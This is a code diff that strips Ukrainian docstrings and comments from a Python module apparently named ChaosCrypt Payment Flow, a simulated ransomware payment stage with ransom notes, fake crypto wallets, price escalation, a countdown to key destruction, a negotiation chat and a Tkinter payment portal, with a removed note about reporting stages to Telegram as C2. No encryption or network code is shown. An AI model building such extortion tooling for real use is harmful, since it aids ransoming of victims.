@@ -1,23 +1,3 @@
-"""
-ChaosCrypt Payment Flow — Ransom Payment & Key Delivery Simulation
-====================================================================
-Повний цикл вимагання викупу:
-
-  1. Payment Portal GUI     — вікно "оплати" з BTC-а��ресою, QR, таймером
-  2. Wallet Generator       — генерація fake BTC/ETH/XMR адрес
-  3. Payment Verification   — симуляція перевірки "оплати" з прогрес-баром
-  4. Key Delivery           — видача ключа розшифровки після "оплати"
-  5. Ransom Escalation      — збільшення суми якщо не платиш
-  6. Countdown Timer        — 48-годинний таймер до знищення ключів
-  7. Negotiation Chat       — "чат з хакерами" в Tkinter
-  8. Receipt Generator      — генерація "квитанції" після оплати
-  9. TG Integration         — всі етапи шлються в TG (C2 perspective)
-  10. Pipeline              — повний цикл від вимоги до видачі ключа
-
-LogBook phase: "payment"
-Працює з: show_case.py, stealth_case.py, chaos_effects.py, decryptor_gui.py
-"""
-
 import os
 import sys
 import time
@@ -93,13 +73,11 @@ VICTIM_MESSAGES = [
 
 
 def _display_width(text):
-    """Рахує реальну ширину рядка в консолі (emoji/wide = 2, ascii = 1)."""
     width = 0
     i = 0
     chars = list(text)
     while i < len(chars):
         ch = chars[i]
-        # Пропускаємо variation selectors (FE0E/FE0F)
         if ch in ('\ufe0e', '\ufe0f'):
             i += 1
             continue
@@ -127,7 +105,6 @@ def _display_width(text):
 
 
 class WalletGenerator:
-    """Генерує realistic fake crypto-адреси."""
     @staticmethod
     def generate_btc():
         chars = string.ascii_lowercase + string.digits
@@ -162,7 +139,6 @@ class WalletGenerator:
 
 
 class PaymentFlow:
-    """Ransom payment simulation — від вимоги до видачі ключа."""
     def __init__(self):
         self.logger = LogBook(phase=PAYMENT_PHASE)
         self.session_id = hashlib.md5(
@@ -185,7 +161,6 @@ class PaymentFlow:
 
     @staticmethod
     def _box_line(text="", width=60):
-        """Рядок рамки з ідеальним вирівнюванням. Внутрішня ширина = width."""
         if not text:
             return "║ " + " " * width + " ║"
         content = text
@@ -197,7 +172,6 @@ class PaymentFlow:
 
     @staticmethod
     def _box_center(text, width=60):
-        """Центрований рядок рамки."""
         dw = _display_width(text)
         total_pad = width - dw
         if total_pad < 0:
@@ -223,7 +197,6 @@ class PaymentFlow:
         return "║ " + " " * width + " ║"
 
     def collect_encryption_keys(self):
-        """Збирає ключі шифрування з логів show/stealth."""
         print("[PAYMENT] ─── Collecting Encryption Keys ───")
         keys = {}
 
@@ -269,7 +242,6 @@ class PaymentFlow:
         return keys
 
     def generate_ransom_note(self):
-        """Генерує детальну записку вимагача."""
         print("[PAYMENT] ─── Generating Ransom Note ───")
         amount = RANSOM_AMOUNTS[self.current_tier]
         W = 60
@@ -367,7 +339,6 @@ class PaymentFlow:
         return note
 
     def escalate_price(self):
-        """Підвищує ціну викупу."""
         tiers = list(RANSOM_AMOUNTS.keys())
         current_idx = tiers.index(self.current_tier)
         if current_idx < len(tiers) - 1:
@@ -394,7 +365,6 @@ class PaymentFlow:
             print("[PAYMENT] Already at maximum price tier.")
 
     def verify_payment_console(self):
-        """Симулює перевірку оплати в консолі з прогрес-баром."""
         print("[PAYMENT] ─── Payment Verification ───")
         tx_id = WalletGenerator.generate_transaction_id()
 
@@ -459,7 +429,6 @@ class PaymentFlow:
         return tx_id
 
     def deliver_keys(self):
-        """Видає ключі розшифровки після підтвердження оплати."""
         print("[PAYMENT] ─── Key Delivery ───")
 
         if not self.payment_confirmed:
@@ -535,7 +504,6 @@ class PaymentFlow:
         return delivery
 
     def generate_receipt(self, tx_id):
-        """Генерує квитанцію після оплати."""
         print("[PAYMENT] ─── Generating Receipt ───")
         amount = RANSOM_AMOUNTS[self.current_tier]
         ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
@@ -596,7 +564,6 @@ class PaymentFlow:
         return RECEIPT_PATH
 
     def negotiation_chat_console(self, rounds=5):
-        """Симулює 'чат' з хакерами в консолі."""
         print("[PAYMENT] ─── Negotiation Chat ───")
         W = 50
         print()
@@ -671,7 +638,6 @@ class PaymentFlow:
             )
 
     def payment_portal_gui(self, duration=20):
-        """Вікно порталу оплати з QR, таймером, BTC адресою."""
         print("[PAYMENT] ─── Payment Portal GUI ───")
         try:
             import tkinter as tk
@@ -805,7 +771,6 @@ class PaymentFlow:
             print(f"[PAYMENT] Portal error: {e}")
 
     def countdown_display(self, seconds=10):
-        """Показує countdown до знищення ключів."""
         print("[PAYMENT] ─── Destruction Countdown ───")
         print()
         print("  KEYS WILL BE DESTROYED IN:")
@@ -834,7 +799,6 @@ class PaymentFlow:
 
 
     def run_full_pipeline(self):
-        """Повний цикл: вимога -> переговори -> оплата -> верифікація -> ключі -> квитанція."""
         print("\n" + "=" * 60)
         print("*** ChaosCrypt Payment Flow — Full Pipeline ***")
         print("=" * 60)
